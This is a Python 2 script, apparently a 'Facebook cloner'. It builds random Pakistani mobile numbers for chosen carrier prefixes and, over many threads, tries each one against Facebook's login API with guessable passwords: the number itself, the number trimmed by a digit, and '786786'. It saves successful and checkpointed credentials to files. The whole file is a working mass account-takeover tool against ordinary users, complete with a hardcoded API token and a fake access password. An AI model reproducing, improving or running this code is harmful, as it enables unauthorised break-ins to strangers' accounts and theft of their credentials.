#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(50000):
 
    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')
 
    print(nmbr)
 
    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
 
 
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
logo="""\033[1;92m
 $$$$$$\            $$\                           $$$$$$\  
$$  __$$\           $$ |                         $$  __$$\ 
$$ /  $$ | $$$$$$$\ $$$$$$$\   $$$$$$\  $$$$$$\  $$ /  \__|
$$$$$$$$ |$$  _____|$$  __$$\ $$  __$$\ \____$$\ $$$$\     
$$  __$$ |\$$$$$$\  $$ |  $$ |$$ |  \__|$$$$$$$ |$$  _|    
$$ |  $$ | \____$$\ $$ |  $$ |$$ |     $$  __$$ |$$ |      
$$ |  $$ |$$$$$$$  |$$ |  $$ |$$ |     \$$$$$$$ |$$ |      
\__|  \__|\_______/ \__|  \__|\__|      \_______|\__|      
                                                           
                Author:Muhammad Ashraf                                           
                                                           
"""
def exb():
	print '[!] Exit'
	os.sys.exit()
 
def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
 
def t():
    time.sleep(1)
def cb():
    os.system('clear')
##### ABIRHOSSAIN#####
##### LOGO #####
os.system("clear")
print(logo)
back = 0
successful = []
cpb = []
oks = []
id = []
count=0
while count <9999999:
	   username = raw_input('\033[1;95mEnter username:\033[1;96m  ')
	   print
	   password = raw_input('\033[1;95mEnter password:\033[1;96m  ')
	   if password=='Fastlink' and username=='Fastlink':
	       print('Access granted')
	       #os.system("xdg-open https://facebook.com/Abir-Hossain-104247341997068/?substory_index=0")
	       break
	   else:
   	    print('\033[1;94m Access denied. Try again.')
   	    count += 1
   	    print("			\033[1;91mFor User & Password Contact With Owner")
   	    #os.system("xdg-open https://facebook.com/Abir-Hossain-104247341997068/?substory_index=0")
def menu():
	os.system('clear')
	print(logo)
	print
	print "\x1b[1;94m______________________________________"
	print
	print "\033[1;91mPAKISTAN FACEBOOK CLONER"
	print
	print "\033[1;92m[1]  JAZZ"
	print "\033[1;92m[2]  TELENOR"
	print "\033[1;92m[3]  WARID"
	print "\033[1;92m[4]  UFONE"
	print "\033[1;92m[5]  ZONG"
	print "\033[1;92m[6]  CONTACT ME"
	print "\033[1;92m[0]  EXIT"
	print "\x1b[1;94m______________________________________"
	action()
	
def action():	
	bch =raw_input('\033[1;96mENTER ANY NUMBER : ')
	if bch =='':
		print '[!] Fill in correctly'
		action()
	elif bch =="1":
		os.system("clear")
		print(logo)		
		print " \x1b[1;93mJAZZ CODE"
		print
		print " \033[1;91m00, 01, 02, 03, 04,"
		print
		print " \033[1;91m05, 06, 07, 08, 09,"
		print
		try:
			c = raw_input(" \033[1;97mSELECTE CODE: ")
			k="+923"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="2":			
		os.system("clear")
		print(logo)
		print " \033[1;91mTELENOR CODE"
		print
		print " \033[1;93m40, 41, 42, 43, 44,"
		print
		print " \033[1;93m45, 46,47,48,49"
		print
		try:
			c = raw_input(" \033[1;97mSELECTE CODE: ")
			k="+923"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="3":			
		os.system("clear")
		print(logo)
		print " \033[1;96mWARID CODE"
		print		
		print " \033[1;95m20, 21, 22, 23,24"
		print
		try:
			c = raw_input(" \033[1;97mSELECTE CODE: ")
			k="+923"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()	
	elif bch =="4":
		os.system("clear")
		print(logo)		
		print " \033[1;91mUFONE CODE"	
		print
		print " \033[1;94m31, 32, 33, 34,"
		print
		print " \033[1;94m35, 36, 37"
		print
		try:
			c = raw_input(" \033[1;97mSELECTE CODE: ")
			k="+923"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines(): 
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()	
	elif bch =="5":
		os.system("clear")
		print(logo)	
		print " \033[1;95mZONG CODE "
		print		
		print " \033[1;93m10, 11, 12, 13"
		print
		print " \033[1;93m14, 15, 16, 17"
		print
		try:
			c = raw_input(" \033[1;97mSELECTE CODE: ")
			k="+923"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="6":
	    os.system("clear")
	    print(logo)
	    
	    time.sleep(2)
	    #os.system('xdg-open https://facebook.com/Abir-Hossain-104247341997068/?substory_index=0')
	elif bch =='0':
		exb()
	else:
		print '[!] Fill in correctly'
		action()
	print
	print
	xxx = str(len(id))
	psb ('\033[1;93m[\033[1;91m√\033[1;93m] \033[1;96mTotal Numbers: '+xxx)
	time.sleep(0.5)
	psb ('\033[1;93m[\033[1;91m√\033[1;93m] \033[1;92mPlease wait, process is running ...')
	time.sleep(0.5)
	psb ('\033[1;93m[\033[1;91m√\033[1;93m] \033[1;95m Muhammad Ashraf Fastlink 06/07 Digit Cracking tool ...')
	time.sleep(0.5)
	psb ('\033[1;93m[\033[1;91m√\033[1;93m] \033[1;91mFor stop this process press ctrl+z ')
	time.sleep(0.5)
	print 53*'═'
	print
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print'\x1b[1;92m[Successfull] \x1b[1;95m\x1b[1;93m\x1b[1;96m' + k + c + user + '\x1b[1;93m\x1b[1;95m <=> '+ pass1															
				okb = open('/sdcard/save/successfull.txt', 'a')
				okb.write(k+c+user+'|'+pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '\x1b[1;96m[chekpoint] \x1b[1;95m\x1b[1;93m\x1b[1;94m' + k + c + user + '\x1b[1;93m\x1b[1;93m <=> '+ pass1
					cps = open('/sdcard/save/checkpoint.txt', 'a')
					cps.write(k+c+user+'|'+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
				else:	
					pass2 = user[1:]
					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                q = json.load(data)
					if 'access_token' in q:
		                        	print'\x1b[1;92m[Successfull] \x1b[1;95m\x1b[1;93m\x1b[1;96m' + k + c + user + '\x1b[1;93m\x1b[1;95m <=> '+ pass2                    											
						okb = open('/sdcard/save/successfull.txt', 'a')
						okb.write(k+c+user+'|'+pass2+'\n')
						okb.close()
						oks.append(c+user+pass2)
					else:	
						if 'www.facebook.com' in q['error_msg']:
							print '\x1b[1;96m[chekpoint] \x1b[1;95m\x1b[1;93m\x1b[1;94m' + k + c + user + '\x1b[1;93m\x1b[1;93m <=> '+ pass2							
							cps = open('/sdcard/save/checkpoint.txt', 'a')
							cps.write(k+c+user+'|'+pass2+'\n')
							cps.close()
							cpb.append(c+user+pass2)
						else:	
							pass3 = '786786'
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                                q = json.load(data)
							if 'access_token' in q:
								print'\x1b[1;92m[Successfull] \x1b[1;95m\x1b[1;93m\x1b[1;96m' + k + c + user + '\x1b[1;93m\x1b[1;95m <=> '+ pass3
								okb = open('/sdcard/save/successfull.txt', 'a')
								okb.write(k+c+user+'|'+pass3+'\n')
								okb.close()
								oks.append(c+user+pass3)
							else:	
								if 'www.facebook.com' in q['error_msg']:
									print '\x1b[1;96m[chekpoint] \x1b[1;95m\x1b[1;93m\x1b[1;94m' + k + c + user + '\x1b[1;93m\x1b[1;93m <=> '+ pass3
									cps = open('/sdcard/save/checkpoint.txt', 'a')
									cps.write(k+c+user+'|'+pass3+'\n')
									cps.close()
									cpb.append(c+user+pass3)
								
							
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 53*'═'
	print '\033[1;93m[\033[1;91m√\033[1;93m] \033[1;92mProcess Has Been Completed ....'
	print '\033[1;93m[\033[1;91m√\033[1;93m] \033[1;92mTotal OK/CP : '+str(len(oks))+'/'+str(len(cpb))
	print('\033[1;93m[\033[1;91m√\033[1;93m] \033[1;96mOK File Has Been saved : /sdcard/save/successfull.txt')
	print('\033[1;93m[\033[1;91m√\033[1;93m] \033[1;96mCP File Has Been saved : /sdcard/save/checkpoint.txt')
	raw_input('\033[1;93mPress Enter To Go Back]')
	os.system('python2 Pakcloner.py')
		
if __name__ == '__main__':
	menu()
